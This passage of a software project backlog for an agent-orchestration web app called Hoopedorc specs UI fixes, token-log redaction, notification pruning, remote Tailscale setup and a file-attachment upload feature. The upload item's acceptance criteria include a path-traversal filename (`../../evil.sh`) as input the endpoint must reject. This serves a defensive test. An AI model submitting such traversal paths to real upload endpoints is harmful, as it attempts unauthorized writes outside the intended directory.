Project), and the action also appears as a button in empty states — two
ways in, one of them pretending to be a page.

**Fix:** remove `new-project` from `NAV`; add a small "+ New" button next
to the project selector in the top row (it's an app-level action, so it
belongs with the app-level selector). The `page` state keeps supporting
`"new-project"` — only the affordance moves. While in there, visually
separate project-scoped tabs (Board…Notifications) from global ones
(Projects/Settings/Setup) with a divider.

**Acceptance:** New Project reachable from every page via the top-row
button; the tab list has 8 entries; empty-state buttons still work.

### U10. Dependency chips truncate with no full-title affordance — TRIVIAL

**Where:** `apps/web/src/components/TaskCard.tsx` (the "blocked by …"
chips).

**Problem:** chips ellipsize ("blocked by Orchestrator eng…") and there's
no hover/tooltip to read the full dependency title.

**Fix:** `title` attribute with the full task title on each chip.

**Acceptance:** hovering a truncated chip shows the full title.

### What the walkthrough did NOT flag (for calibration)

The narrow/phone layout genuinely holds up (the two-row nav and full-width
cards adapt cleanly — F4's layout comments paid off); Setup & Health is the
strongest page in the app; empty states (Audit, Notifications) are clear;
the TaskDrawer and TokenGate are clean. The wave above is polish on a
fundamentally sound UI, not a redesign.

### Beyond the UX wave (not specced — decide when U1–U10 land)

- **F13 phase 1 — gates-only sandbox**, per `docs/specs/sandbox.md`'s
  phased rollout. The biggest remaining security-posture item.
- **A real `@orc/server` test package.** The only workspace with no test
  script. `scheduler.ts`, `budget.ts`, and `db/backup.ts` are pure or
  near-pure and already have exactly-shaped standalone-script verifications
  from Phases 5–9 to port into `node --test` files; wire into CI's existing
  test steps.
- **Quota usage in SetupView's model-health panel** — F16's explicitly
  skipped nice-to-have ("N runs / $X used this window").
- **v0.2.0 tagged** with this Part's docs PR; keep tagging at wave
  boundaries.

---

## Part 5 — Post-UX-wave fixes & remote-QoL wave (Fable, 2026-07-07)

Produced by auditing the merged U1–U10 code (PRs #59–#62) on `main`, plus a
review of the whole app against the deployment the owner actually plans:
the server on an EC2 instance inside a Tailscale tailnet, planned and
supervised from any device (often a phone), running near-autonomously.
Every "Problem" below was confirmed against the actual code on `main`, not
inferred from the progress notes. Verdict on the U1–U10 wave itself: all
ten items are genuinely implemented as specced and the verification claims
held up — this Part is polish and gaps *around* that work, not rework.

**Workflow (same as Parts 1–4):**
- Branch → PR → merge; CI (F14) green on every PR; item IDs in commit
  messages; update the Phase 10 table in Progress as you land.
- Verification bar unchanged: typecheck/build/engine+adapter tests green,
  live verification (the `agent-browser` pattern) for anything with a UI
  surface, evidence in PR descriptions — Fable re-verifies after merge.
  Part 3's browser note still applies (pick the local macOS browser).
- The verify-before-writing rule from F15/F17 applies doubly to F20: never
  document a command you haven't run — where this environment can't run
  one (no tailscale, no EC2), say so explicitly in the doc text.

### Fixes (do these first, top-down)

### B20. Projects-page "Pause" is an unconfirmed hard abort — HIGH (footgun)

**Where:** `apps/web/src/pages/ProjectsView.tsx` (~line 161 — the
running-project branch calls `act(p.id, "pauseProject", { drain: false })`).

**Problem:** the row's single run-control is labeled "⏸ Pause" but passes
`drain: false` — the immediate-abort mode. Its own tooltip admits it
("Abort any running task immediately and requeue it to backlog").
`ProjectHeader.tsx` gets this right: "Pause (finish current)" is
`drain: true`, and the destructive "Stop now" is a separate button behind a
`window.confirm`. On the Projects page, one click on something labeled
*Pause* kills a running agent mid-task with no confirmation — exactly the
class of misclick U6 moved the model dropdown to avoid. (The row buttons
landed with F12 and predate the UX wave; nobody re-checked them against
F3's pause-mode split.)

**Fix:** mirror ProjectHeader on the row: "Pause" → `{ drain: true }` with
the finish-current tooltip; add a separate "Stop now" button using the same
confirm copy `ProjectHeader.stopNow()` uses. Keep both visually compact
(the row is already dense).

**Acceptance:** with a task running, clicking the row's Pause leaves the
active agent running (drains after it finishes — no abort); Stop now asks
for confirmation and aborts on confirm; tooltips match actual behavior.
Live-verify the non-destructive path against a scratch project (no real
model cost needed — the mock server's seed is fine for the button wiring;
the drain semantics themselves were verified back in F3).

### S7. API token written to server logs via the WS query param — MEDIUM

**Where:** `packages/server/src/index.ts` (~line 506,
`Fastify({ logger: true })`); `apps/web/src/hooks/useWS.ts` appends
`?token=<API_TOKEN>` to the upgrade URL (by design — browsers can't set
headers on a WS upgrade; S2/S6).

**Problem:** Fastify's default request logging includes the full request
URL, so every WebSocket connect writes `GET /ws?token=<the real token>` to
stdout — which systemd persists in the journal on the target EC2
deployment. S6's own verification evidence quotes exactly such log lines.
Anyone who can read the logs (or a log snippet pasted into a bug report)
gets the token.

**Fix:** override the logger's `req` serializer to redact the `token`
query parameter from the logged URL (e.g.
`url.replace(/([?&]token=)[^&]*/, "$1[redacted]")`) while keeping
method/path/status logging intact. Check the actual serializer shape
against the installed Fastify version's docs/output — don't assume it from
memory. Also grep the server for any other place a request URL is logged
(the auth hook, `ws-hub.ts`) and redact there too.

**Acceptance:** boot with `API_TOKEN` set, connect the web app → the
server log shows `/ws?token=[redacted]`, and `grep`ing the captured log
output for the real token finds nothing; normal request logging still
shows method/path/status; a wrong-token 401's log line is redacted too.

### B21. Board drag-and-drop failures are silent — LOW

**Where:** `apps/web/src/pages/Board.tsx` `handleDrop` (~line 360 — the
catch reverts the optimistic move and shows nothing).

**Problem:** B5's server rules reject most manual status moves with
genuinely useful messages ("PATCH can only requeue a task to \"backlog\"
or \"ready\"", a 409 telling you to Stop an active task first). The catch
swallows them, so the card just snaps back — indistinguishable from the
drag not registering. U3's own live-testing hit exactly this confusion
(two fixture picks "failed silently" before those rules were understood).

**Fix:** `toast(String(e), "error")` in the catch — `useToast` is already
in scope in Board.tsx.

**Acceptance:** dragging an in-progress card to Done shows a toast with
the server's message and the card reverts; a valid backlog→ready drag
stays silent.

### B22. Schedule form can silently delete a saved schedule — MEDIUM (data loss)

**Where:** `apps/web/src/components/ProjectConfigFields.tsx`
`projectConfigFromForm` (~lines 111–124).

**Problem:** the schedule is only emitted when its fields are complete
(daily needs hour AND minute; interval needs hours). A partially-filled
form — hour set, minute blank; or the mode switched to interval with hours
blank — omits `schedule` from the produced config entirely, so saving
**deletes the previously stored schedule** with no warning. This is the
same bug class U7 fixed for the enabled-checkbox, one level down.

**Fix:** distinguish three cases: all schedule fields blank → no schedule
(intentional removal — current behavior, keep); complete → emit (keep);
**partial → invalid**. For the partial case, export a
`projectConfigFormError(form): string | null` helper from
ProjectConfigFields and have both save sites (ProjectHeader's `saveConfig`
and NewProject's create) disable save and show the message ("Schedule
needs both HH and MM" / "Interval schedule needs hours"). Show the same
hint inline next to the schedule inputs so the fix is discoverable before
the save attempt.

**Acceptance:** with a saved daily schedule, blanking the minute → save is
blocked with a visible message and the stored schedule survives (verify
via `GET /api/projects/:id`); blanking hour AND minute then saving removes
the schedule (intentional path still works); NewProject shows the same
validation.

### B23. `notifications` table grows unbounded — LOW

**Where:** `packages/server/src/db/repo.ts` `getNotifications` (~line 782
— no LIMIT); nothing prunes notifications (B14 covered only `logs`; B10
only marks stale approvals expired, never deletes);
`apps/web/src/pages/Notifications.tsx` and App.tsx's U1 badge seed both
fetch the full list.

**Problem:** months of autonomous runs accumulate thousands of rows, all
fetched and rendered on every Notifications visit and every badge seed.

**Fix:** mirror B14's pattern: prune on boot + daily in `main()` — delete
notifications older than `NOTIFICATION_RETENTION_DAYS` (env, default 30)
**except** rows with `requiresApproval` and no `respondedWith` (a pending
approval must never be silently deleted, no matter how old). Add a LIMIT
(default ~200, newest first — the query already orders by `created_at
DESC`) to `getNotifications`. Add the env var to `.env.example`.

**Acceptance:** seed 300 old responded notifications + 1 old pending
approval → boot → the old responded rows are pruned, the pending approval
survives; the page and the U1 badge still work.

### B24. Browser-notification dead ends are silent — LOW

**Where:** `apps/web/src/hooks/useBrowserNotify.tsx` (~line 8 `SUPPORTED`;
~line 46 the constructor try/catch); `Settings.tsx`'s "Browser
Notifications" section; `docs/USER_GUIDE.md`.

**Problem:** two dead ends the UI currently hides. (1) Over plain HTTP
from another machine (`http://<tailnet-ip>:3987`) there is no secure
context, so the Notification API is unavailable — Settings just says "Not
supported in this browser" with no hint that the fix is HTTPS (see F20).
(2) On Android Chrome, `new Notification(...)` **throws even with
permission granted** (that platform only allows
`ServiceWorkerRegistration.showNotification`) — the catch swallows it, so
the user "enables" notifications that can never fire and Settings shows a
green "Enabled."

**Fix:** honest messaging, not a service worker (that's future work F26
notes as its hook). (1) When `!window.isSecureContext`, show specific
copy: "Needs HTTPS — see the user guide's Remote setup (`tailscale
serve`)." (2) On grant, fire a test notification inside the same try/catch
and surface a failure state ("This browser can't show page notifications —
rely on Telegram for pings on this device."). (3) Update the guide's
notification mentions: browser notifications are for desktop browsers over
HTTPS/localhost; on phones, Telegram is the channel.

**Acceptance:** over an insecure non-localhost origin, Settings explains
the HTTPS requirement instead of the generic "not supported"; on a
platform where construction throws, enabling surfaces the failure message
instead of "Enabled."; guide updated.

### QoL wave (after the fixes, top-down)

### F20. Remote setup docs: `tailscale serve` HTTPS + EC2 headless auth — docs only, do first

**Where:** `docs/USER_GUIDE.md` "Remote setup (Tailscale)" (~line 173);
`deploy/README.md`; B24's Settings copy links here.

**Problem:** the current remote section says `HOST=0.0.0.0` + `API_TOKEN`.
That works, but it's strictly worse than the tailscale-native path, and it
leaves everything on plain HTTP — which quietly breaks secure-context
browser features (B24) and sends the bearer token unencrypted (fine inside
WireGuard, but only inside it). And there is no EC2/headless-Linux
guidance at all, even though that's the owner's actual target — the CLIs'
login flows are exactly where a first headless deploy stalls.

**Fix (rewrite the Remote setup section + add an EC2 section):**
1. **Recommended path:** keep `HOST=127.0.0.1` and put `tailscale serve`
   in front — it serves `https://<machine>.<tailnet>.ts.net` with a
   trusted cert, proxying to localhost, so no non-loopback bind is needed
   at all (the API_TOKEN startup refusal never triggers; still recommend
   setting a token as defense in depth). **Verify the exact invocation
   with a real `tailscale` CLI** (`tailscale serve --help`) before writing
   it down; if no tailscale is installed in this environment, write the
   command from current official docs and mark it "verify on your box"
   explicitly. Warn: `tailscale funnel` exposes the port to the public
   internet — never use it for this.
2. Keep the existing `HOST=0.0.0.0` + token instructions as the
   documented fallback.
3. New **"EC2 / headless Linux"** subsection: prereqs (node 22, git, gh,
   claude, opencode), then headless auth for each CLI — `gh auth login`'s
   device flow; `opencode auth login`; Claude Code on Linux (note the F10
   Keychain caveat is macOS/container-specific — on Linux the credentials
   live on disk, so subscription auth is expected to work; document the
   login flow and the `ANTHROPIC_API_KEY` fallback, and clearly mark
   anything not directly verified). Point at `deploy/`'s systemd unit, the
   DB/backup locations (F17), and cross-link F24's update procedure once
   it exists.

**Acceptance:** the guide's remote section leads with `tailscale serve` +
loopback; an EC2 section exists covering all the CLI auth flows with
verified-vs-unverified clearly marked; B24's Settings copy links to the
section.

### F21. Hash routing + deep links

**Where:** `apps/web/src/App.tsx` (`page` + `selectedProjectId` are plain
`useState`; `STORAGE_KEY` persists only the project).

**Problem:** a refresh anywhere lands back on Board; nothing is linkable —
a phone user can't bookmark Notifications, and a Telegram approval can't
link into the app (F22 wants exactly that). For a multi-device deployment
this is the single biggest friction item.

**Fix:** sync page + project to the URL hash — no router dependency:
- Format: `#/<page>` for global pages (`#/settings`), `#/p/<projectId>/
  <page>` for project pages (`#/p/abc123/board`).
- On load: parse the hash; a valid project id in it wins over
  localStorage; invalid/empty falls back to current behavior (stored
  project, Board, F1's welcome redirect unchanged).
- On navigation: write the hash (pushState, so back/forward work) — all
  through the existing `navigate()` so the U4 dirty-guard keeps working.
  Listen to `hashchange` for back/forward and route it through the same
  guard; if the user cancels the confirm, restore the previous hash.
- Keep it page-level only: the selected task / drawer state does NOT go
  into the URL (avoids hash churn on every card click).

**Acceptance:** refresh on Costs stays on Costs for the same project;
pasting `#/notifications` into a fresh tab opens Notifications; browser
back returns to the previous page; with dirty Settings, both a tab click
and browser-back still confirm, and cancel keeps the edits; the first-run
onboarding redirect still works.

### F22. Approval context (PR link + validator reasons) in the web UI

**Where:** `packages/types/src/domain.ts` `Notification` (no context field
today); the F5 `ApprovalContext` plumbing (engine-runner → `telegram.ts`)
that already computes PR url + top validator reasons;
`packages/server/src/db` (notifications schema — the standard `ALTER
TABLE` migration list); `apps/web/src/pages/Notifications.tsx`; mock
server seed; CONTRACT.md.

**Problem:** F5 enriched only the *Telegram* message. The web card is
title + message, so approving from the app (phone or desktop) means
deciding blind or hunting the Board for the task's drawer. For "step in
from any device," the approval screen should carry what the decision
needs.

**Fix:** add optional `context?: { prUrl?: string; reasons?: string[] }`
to `Notification` (types + CONTRACT.md + a mock-seed example); persist it
(new nullable JSON column via the migration list); populate it at the same
site telegram's `ApprovalContext` is built — one source, both channels;
render it on the Notifications card when present: a "View PR ↗" link and
the reasons as a short list above the approve/reject buttons. Rows without
context render exactly as today.

**Acceptance:** a new risky-merge approval shows the PR link + reasons on
the web card (live-verify via a seeded approval with context — same
technique as U1's batch); rows predating the migration render unchanged;
Telegram output unchanged; CONTRACT.md updated.

### F23. Global "Stop all" control

**Where:** `apps/web/src/App.tsx` (nav top row);
`packages/server/src/index.ts` + `ROUTES` in `@orc/types` + CONTRACT.md +
mock server.

**Problem:** the safety rails are all per-project. The owner's scenario is
several projects running unattended; when something looks wrong from a
phone, "make everything stop NOW" currently takes Projects page → per-row
action → repeat. A panic control should be one confirmed tap from
anywhere.

**Fix:** new route `POST /api/engine/stop-all` — for every running
project, call the existing `engine.pause(project, { drain: false })` (the
same abort path the per-project Stop now uses); write one audit entry
(kind `"stopped"`, actor human, listing affected projects); return the
list. Verify manually-dispatched tasks are covered by that path (the
B1/B3 `manualRuns` machinery) — if not, also call `stopTask` for those.
UI: a red "Stop all" button in the nav top row, rendered only when ≥1
project is running (App already has live project statuses via WS), behind
a `window.confirm` naming the affected projects.

**Acceptance:** two projects running → one click + confirm → both paused,
active agent processes gone within ~3s (the existing SIGTERM→SIGKILL
path), audit entry written; the button is absent when nothing is running;
the mock server implements the route so the UI is verifiable without real
runs.

### F24. Update story: `scripts/update.sh` + version surfacing

**Where:** new `scripts/update.sh`; `packages/server` (health route);
`apps/web/src/pages/SetupView.tsx`; `docs/USER_GUIDE.md` (new "Updating"
section; cross-link from F20's EC2 section).

**Problem:** nothing documents how to update a deployed instance, and the
server doesn't report what version it's running — on a remote box that's
"ssh in and guess."

**Fix:** (1) `scripts/update.sh`: refuse on a dirty tree; warn (prompt) if
any project is currently running (`GET /api/projects` against localhost,
tolerating the server being down); then `git pull --ff-only && npm ci &&
npm run build`; restart via systemd if the `hoopedorc` unit exists, else
print the restart instruction. (2) Add `version` (from the root
`package.json`) to `GET /api/health`; show it on SetupView ("Hoopedorc
vX.Y.Z"). (3) Short "Updating" section in the guide.

**Acceptance:** the script runs end-to-end on a clean checkout locally
(minus the systemd step — environment-dependent, mark it); a dirty tree →
refusal; `/api/health` returns the version and SetupView displays it.

### F25. Single shared WebSocket connection

**Where:** `apps/web/src/hooks/useWS.ts` and its call sites (`App.tsx`,
`Board.tsx`, `MissionControl.tsx`, `Notifications.tsx`).

**Problem:** every `useWS` call opens its own socket, so the Board view
holds **three** concurrent connections (App + Board + MissionControl) to
the same server for the same project — three reconnect storms after every
server restart or phone sleep, three snapshot replays, for zero benefit.

**Fix:** a module-level connection manager — one socket, reference-counted
handler registry, the same backoff logic; `useWS` keeps its exact
signature so call sites don't change. All current subscribers use the same
projectId; on projectId change, resubscribe once. Note `ws-hub.ts` tracks
one subscription per socket — verify that stays satisfied (it does, since
all subscribers share the projectId; log a warning if a second distinct
projectId ever registers, so a future regression is visible).

**Acceptance:** the Board view opens exactly one WS connection (server log
/ devtools network tab); the U1 badge, MissionControl approvals, and Board
live logs all still update; kill and restart the server → a single
reconnection, everything resumes.

### F26. PWA manifest

**Where:** `apps/web/index.html`, `apps/web/public/`.

**Problem:** on a phone the app lives in a browser tab; add-to-home-screen
produces a generic bookmark. An installable manifest gives it an icon and
a standalone window, and is the prerequisite for any future service-worker
notification work (the honest gap B24 documents).

**Fix:** `manifest.webmanifest` (name/short_name "Hoopedorc", `display:
standalone`, background/theme `#0a0a0a`, 192/512 icons — a simple
generated monogram is fine), `<link rel="manifest">` + theme-color meta.
**No service worker in this item.**

**Acceptance:** Chrome devtools' manifest panel shows no errors;
add-to-home-screen installs with the icon and opens standalone; the built
`dist` (F10's static-serving path) serves the manifest and icons.

### UX polish (small, batch together)

### U11. No `beforeunload` guard while Settings is dirty — LOW

**Where:** `apps/web/src/pages/Settings.tsx` (U4 guarded in-app nav only).

**Problem:** U4's confirm covers tab clicks, but reload/close — an easy
reflex on a phone — still discards edits silently.

**Fix:** while dirty, register a `beforeunload` handler that calls
`preventDefault()` (the standard browser "unsaved changes" prompt); remove
it when clean or on unmount.

**Acceptance:** dirty → reload → the native confirm appears; after save,
reload is silent.

### U12. `agoLabel` has no hours unit — TRIVIAL

**Where:** `apps/web/src/components/TaskCard.tsx` `agoLabel` (~line 8).

**Problem:** a 2-hour run reads "127m 33s ago" on card heartbeats and the
MissionControl strip.

**Fix:** ≥ 60m → `${h}h ${m}m ago`. Verify MissionControl's " ago"-suffix
strip still produces "elapsed 2h 5m".

**Acceptance:** 2h 5m renders "2h 5m ago" (card) and "elapsed 2h 5m"
(strip).

### U13. MissionControl "elapsed" resets on status transitions — LOW

**Where:** `apps/web/src/components/MissionControl.tsx` (~line 90 computes
elapsed from `task.updatedAt`).

**Problem:** `updatedAt` bumps on every task update — including the
mid-attempt `in_progress → in_review` transition (B6) — so "elapsed"
visibly resets to zero while the same attempt is still going.

**Fix:** Board already sees every `task.updated`: record the timestamp a
task *enters* the active set (status changes into `in_progress` from a
non-active status) in a small map and pass it to MissionControl; fall back
to `updatedAt` when unknown (initial page load). Don't fetch runs for
this.

**Acceptance:** a task moving `in_progress → in_review` keeps its elapsed
counter; after a reload the label is still roughly right (fallback).

### U14. Notifications page: pending approvals should sort first — LOW

**Where:** `apps/web/src/pages/Notifications.tsx` (renders in fetch order,
`createdAt` DESC).

**Problem:** the one thing that blocks a run — a pending approval — can
sit below newer info/warn noise.

**Fix:** sort pending approvals (`requiresApproval && !respondedWith`) to
the top, newest first within each group; optionally a "Needs response"
subheading when any exist.

**Acceptance:** an older pending approval renders above newer info items;
once responded, it drops back into chronological order.

### What Part 5 deliberately does NOT include (for calibration)

- **No service worker / push notifications** — B24 fixes the messaging,
  F26 lays the manifest groundwork; actual SW notifications are future
  work (Telegram already covers the phone-ping channel well).
- **No sandbox work** — F13 phase 1 (gates-only, per
  `docs/specs/sandbox.md`) remains the biggest security-posture item on
  the post-Part-5 backlog, along with the rest of Part 4's "Beyond the UX
  wave" list (an `@orc/server` test package, quota usage in the health
  panel, release tagging).

---

## Part 6 — Owner-requested QoL wave + Phase 10 audit fixes (Fable, 2026-07-07)

Two halves, same as Parts 3–5. First, the **audit record** for the merged
Phase 10 work (PRs #64–#76): every item was re-verified against the actual
code on `main`, all sixteen are genuinely implemented as specced, and the
verification claims held up — the three fixes below are small gaps *around*
that work, not rework. Second, the **owner's QoL wave**: eight requests from
the owner (2026-07-07), specced as F27–F34 after reading the real code paths
each one touches, plus the two leftovers from Part 4's "Beyond the UX wave"
list that are now cheap enough to just do (T1, F35).

**Decisions on the previously-deferred optional items** (so they stop
haunting every wave):
- `@orc/server` test package — **in scope now** (T1). Everything it needs to
  test is pure or near-pure and already has exactly-shaped standalone-script
  verifications from Phases 5–10 to port.
- Quota usage in SetupView's health panel — **in scope now** (F35). One repo
  function that already exists, one panel column.
- **F13 phase 1 (gates-only sandbox) — still deferred, deliberately.** It's
  the biggest remaining security-posture item, but it's also the biggest
  chunk of work in the backlog, it needs Docker present on the deployment
  box (an environment question the owner hasn't settled), and nothing in
  this wave depends on it. It should be the headline item of the *next*
  wave, not an add-on to this one.
- F8's optional "pipe the run summary through the updates-role model" toggle
  — **stays unbuilt**. F29/F30 give the docs-role model a real, structural
  documentation job instead; a cosmetic rewording of the mechanical digest
  adds model dependence for little value.
- Service worker / push notifications — **still deferred** (unchanged from
  Part 5's calibration note; Telegram covers the phone-ping channel).

**Workflow (same as Parts 1–5):**
- Branch → PR → merge; CI (F14) green on every PR; item IDs in commit
  messages; update the Phase 11 table in Progress as you land.
- Verification bar unchanged: typecheck/build/engine+adapter (+server, once
  T1 lands) tests green, live verification for anything with a runtime
  surface, evidence in PR descriptions — Fable re-verifies after merge.
  Part 3's browser note still applies (pick the local macOS browser).
- The verify-before-writing rule (F15/F17/F20) applies to every CLI/library
  behavior this Part leans on — called out per item below.
- Several items add prompt text that goes to real models. Keep every new
  prompt block **bounded** (cap lengths on save, slice defensively at the
  injection site) — an unbounded Settings textarea must never be able to
  blow up every author prompt in the system.

### Fixes (do these first, as one small batch)

### B25. USER_GUIDE's `tailscale serve` example uses the wrong port — LOW (docs)

**Where:** `docs/USER_GUIDE.md` ~line 223 (`tailscale serve --bg 3987`).

**Problem:** the app's default port is **4317** (`config.ts` `ENV.port`,
`.env.example`, `deploy/Dockerfile` all agree); the guide's example says
`3987`. The parenthetical below it does say "replace with whatever PORT
you've configured", but a copy-paste of the recommended remote-setup command
on a default install proxies a port nothing listens on — exactly the kind of
first-deploy stall F20 exists to prevent.

**Fix:** change the example (and its parenthetical) to `4317`. Grep the
whole `docs/` + `deploy/` tree for `3987` to catch any other stragglers.

**Acceptance:** `grep -rn 3987 docs deploy` returns nothing; the example
matches `.env.example`'s PORT.

### B26. Old pending approvals can fall off the notification fetch — LOW

**Where:** `packages/server/src/db/repo.ts` `getNotifications` (the B23
`LIMIT 200`); consumers: `apps/web/src/pages/Notifications.tsx`, App.tsx's
U1 badge seed.

**Problem:** B23 was precise that *pruning* never deletes a pending
approval, but the fetch limit has no such exemption: an approval that has
sat unanswered while 200+ newer notifications accumulated (a long unattended
multi-project run is exactly the scenario this app is for) silently drops
off both the Notifications page and the U1 badge seed. The WS path masks it
only until the next reload. B10 bounds the window (approvals expire on
restart), but within one server uptime the one thing that blocks a run can
become invisible.

**Fix:** in `getNotifications`, always include pending approvals regardless
of the limit — e.g. a `UNION` of (all rows with `requires_approval = 1 AND
responded_with IS NULL`) with (the newest `LIMIT ?` rows), de-duplicated,
newest-first. Keep the signature unchanged.

**Acceptance:** new `@orc/server` test (lands with T1 — sequence these
sensibly, or verify via a standalone script if B26 merges first): seed 1 old
pending approval + 250 newer responded notifications → `getNotifications`
returns the pending approval; the page and badge render it.

### B27. `update.sh`'s systemd-unit detection is version-fragile — LOW

**Where:** `scripts/update.sh` (the `systemctl list-unit-files
hoopedorc.service` check).

**Problem:** `systemctl list-unit-files <pattern>` only started exiting
non-zero on zero matches in newer systemd releases; on older ones it prints
"0 unit files listed." and exits 0 — so on such a box the script would run
`sudo systemctl restart hoopedorc` against a unit that doesn't exist
(harmless-ish, but it fails with a confusing error and possibly a sudo
password prompt) instead of printing the manual-restart instruction. F24's
verification never hit this because macOS has no systemd at all (the
`command -v systemctl` guard short-circuits).

**Fix:** make the detection output-based, not exit-code-based:
`systemctl list-unit-files 'hoopedorc.service' 2>/dev/null | grep -q
'^hoopedorc\.service'` (or `systemctl cat hoopedorc >/dev/null 2>&1`).
Verify the chosen form against a real systemd box if one is reachable;
otherwise mark it "verify on your box" in a comment, per the F20 precedent.

**Acceptance:** on a box without the unit, the script prints the
manual-restart instruction and never invokes sudo; shellcheck-clean
(or at minimum `bash -n`) like the rest of the script.

### T1. A real `@orc/server` test package — do before the feature items

**Where:** `packages/server` (only workspace with no test script);
`.github/workflows/ci.yml`; root `package.json`.

**Problem:** Part 4 flagged it, Part 5 deferred it, and this wave adds
several server-side behaviors (B26, F27's upload sanitization, F28's session
files) that deserve real regression tests instead of one-off standalone
scripts that get thrown away after each PR.

**Fix:** add a `test` script to `@orc/server` using `node --test` (the same
runner engine/adapters use — no new dependency). Port the already-designed
standalone verifications into permanent tests: `scheduler.ts isScheduleDue`
(the 13 cases from F19/A3), `budget.ts checkModelQuota` window math (F16),
`db/backup.ts runBackup` (F17's three scenarios), `repo.pruneNotifications`
+ `getNotifications` (B23's pending-approval exemption + B26),
`redactTokenFromUrl` (S7). Real in-memory SQLite via the actual `initDb`/
`repo.*` functions, not mocks. Wire `npm test -w @orc/server` into CI next
to the existing two test steps and into the standing verification bar.

**Acceptance:** `npm test -w @orc/server` green locally and in CI on its own
PR; the five areas above each have at least their historical acceptance
scenarios covered.

### QoL wave (the owner's eight requests, top-down)

### F27. Plan-mode attachments: images/PDFs/files as planning context

**Owner's ask:** "attach files like images, pdf and such in the chat as
attachments. These files would get uploaded to a specific folder in the
project folder as context."

**Where:** `packages/server/src/index.ts` (plan routes, ~line 1184);
`packages/server/src/planner.ts` (`buildChatPrompt`/`buildDeconstructPrompt`);
`apps/web/src/pages/PlanView.tsx`; `@orc/types` `ROUTES` + CONTRACT.md;
new dependency `@fastify/multipart` (v9 line — the Fastify v5-compatible
major; check the actual compatibility table before pinning).

**Design:** attachments live in the project's clone at
`<project.localPath>/context/attachments/<name>`. That directory is the
"specific folder in the project folder" — and because the planner already
runs `claude -p` with the clone as its cwd (`resolvePlannerCwd`), the
planning model can read the files with its own file tools; no
base64-into-prompt plumbing, no size explosion in the transcript.

**Fix:**
1. **Routes:** `POST /api/projects/:id/plan/attachments` (multipart, one
   file per request), `GET .../plan/attachments` (list: name, size, mtime),
   `DELETE .../plan/attachments/:name`. Register in `ROUTES`, CONTRACT.md.
2. **Storage safety (treat this with S-item care — it's a write-to-disk
   endpoint):** take `basename` only; sanitize to `[A-Za-z0-9._-]`
   (reject anything empty or dotfile-leading after sanitizing); resolve the
   final path and require it to stay inside `context/attachments/`
   (prefix check on the resolved path, the same containment reasoning S4
   used); extension allowlist (`png jpg jpeg gif webp pdf md txt csv json`);
   size cap ~25MB (multipart limits option); collision → suffix `-2`, `-3`….
   `DELETE` applies the same sanitize+containment before unlinking.
3. **Planner integration:** both `buildChatPrompt` and
   `buildDeconstructPrompt` gain an "## Attached context files" block listing
   the repo-relative paths that currently exist on disk (server passes the
   list in), with one instruction line: read them with your file tools
   before answering; images and PDFs included. **Verify against the real
   CLI first** (the F15/F17 rule): confirm a headless `claude -p` run in a
   cwd containing a PNG and a PDF can actually read both when the prompt
   names them — don't assume it from Claude Code's interactive behavior.
4. **UI:** an attach button (hidden `<input type="file">`) in PlanView's
   chat composer; uploaded files render as small chips (name + remove ×)
   above the input, seeded from the GET on mount so they survive reload.
   Upload errors surface via the existing toast.
5. **Mock mode:** the seed project's `localPath` is `"."` (the server's own
   cwd) — writing uploads there would dirty this very repo. In `ENV.mock`,
   root attachments at `<tmpdir>/hoopedorc-mock-attachments/<projectId>/`
   instead so the UI stays fully exercisable.

**Acceptance:** upload a PNG and a PDF from PlanView → files appear under
`context/attachments/` with sanitized names; a filename like
`../../evil.sh` or `x.sh` is rejected with a 400; a >25MB file is rejected;
the next chat turn's prompt (verify via a log line or a temporary debug
dump) lists both files; asking the planner "what's in the attached PDF?"
gets a genuinely content-aware answer (live-verify once with a real file);
chips survive a reload; delete removes the file and the chip.

### F28. Plan-chat history archived as markdown session files

**Owner's ask:** "our chat history in plan mode to be recorded in an .md
file in said context folder. If i plan again it should create another .md
file as a different session."

**Where:** `packages/server/src/index.ts` (`/plan/chat`, `/plan/deconstruct`,
`/plan/commit`); `packages/server/src/db` (planning session storage — add a
`session_file` field the same way other columns were added, via the standard
migration list); reuses F27's `context/` convention.

**Design:** one markdown file per planning session at
`<localPath>/context/plan-sessions/<YYYY-MM-DD-HHmm>.md`. A "session" is
exactly what the existing planning-session row already models: it starts
with the first chat turn after the row is empty and ends when `/plan/commit`
clears it (existing behavior, untouched) — so "plan again" naturally starts
a new file.

**Fix:**
1. On each successful `/plan/chat` turn: if the stored session has no
   `session_file`, mint one from the current server-local time and persist
   it; then (re)write the whole file from the stored transcript — a tiny
   header (project name, session start, planner model) followed by
   `## User` / `## Assistant` sections in order. Rewriting wholesale keeps
   it correct without append bookkeeping.
2. On `/plan/deconstruct`: append (same rewrite) a `## Deconstructed plan`
   section — the PRD markdown plus a task list (title, difficulty, role,
   dependsOn).
3. On `/plan/commit`: write one final `## Committed` line (timestamp, task
   count) *before* the session row is cleared. The file itself is the
   durable archive; the cleared row just means the next chat mints a new
   file.
4. A failed file write must never fail the chat/commit request — warn-log
   and continue (same posture as F17's backup failures).
5. Session files are deliberately **not** git-committed by the server
   (unlike the PRD, nothing downstream reads them; they're the owner's
   archive). Note in the user guide that `context/` can be gitignored or
   committed at the user's discretion.

**Acceptance:** run a two-turn plan chat → one session file exists
containing both turns and the reply; deconstruct → the section appends;
commit → the `## Committed` line is present and the *next* chat turn creates
a **new** file; a read-only `context/` directory (chmod it in the test)
doesn't break the chat endpoint.

### F31. Engineering guidelines (coding / UX / security) in author + validator prompts

**Owner's ask:** "guidelines … in terms of UX, Coding structure, Security
that we can add in as system prompts for the coding and validating agents.
Just running the app properly isn't gonna cut it as good work."

**Where:** `@orc/types` `Settings`; `packages/server/src/config.ts`
(`defaultSettings`); `packages/engine/src/orchestrator.ts`
(`buildAuthorPrompt`, ~line 1201); `packages/engine/src/validator.ts` (the
review prompt); `apps/web/src/pages/Settings.tsx`; CONTRACT.md.

**Design:** guidelines are operator-editable text with strong shipped
defaults, injected into *both* sides of the loop — authors are told the
standards up front, and the validator grades against the same text, so
"meets the standards" is a checkable claim rather than vibes.

**Fix:**
1. **Types/defaults:** `Settings.guidelines?: { coding?: string; ux?:
   string; security?: string }`. Ship real defaults in `defaultSettings()`
   (concise, imperative, ~15–20 lines each — not essays):
   - *coding:* follow the repo's existing conventions before inventing new
     ones; small focused modules; no dead/commented-out code; handle errors
     at the boundary that can act on them; no `any`-typed escape hatches in
     TS repos; keep functions testable (pure logic separated from I/O);
     write/update tests for behavior you add.
   - *ux:* every async action shows a loading state and surfaces its errors
     (no silent failures); empty states say what to do next; interactive
     elements are keyboard-reachable; layouts hold up at phone width;
     readable contrast; destructive actions confirm.
